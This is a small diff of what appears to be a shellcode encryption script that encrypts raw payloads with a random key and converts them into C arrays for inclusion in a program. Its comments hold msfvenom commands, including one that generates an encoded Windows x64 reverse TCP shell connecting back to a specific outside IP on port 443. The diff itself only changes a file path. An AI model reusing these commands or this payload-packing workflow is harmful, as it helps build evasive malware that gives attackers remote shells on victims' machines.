@@ -15,7 +15,7 @@ KEY = urandom(8)                                # Random urandom key
 #msfvenom -p windows/x64/messagebox TEXT='Hello World!' -f raw -o mess.raw
 #msfvenom -p windows/x64/shell_reverse_tcp LHOST=81.230.95.134 LPORT=443 -f raw -b
 # '\x00\x0a\x0d\x20' -e x86/shikata_ga_nai -o mess.raw
-#python .\schellcodeencrypt.py mess.raw
+#python .\schellcodeencrypt.py file/mess.raw
 
 def convert_to_c_array(in_data, array_name):
     """Convert data to c array that later can be included in a c program'"""
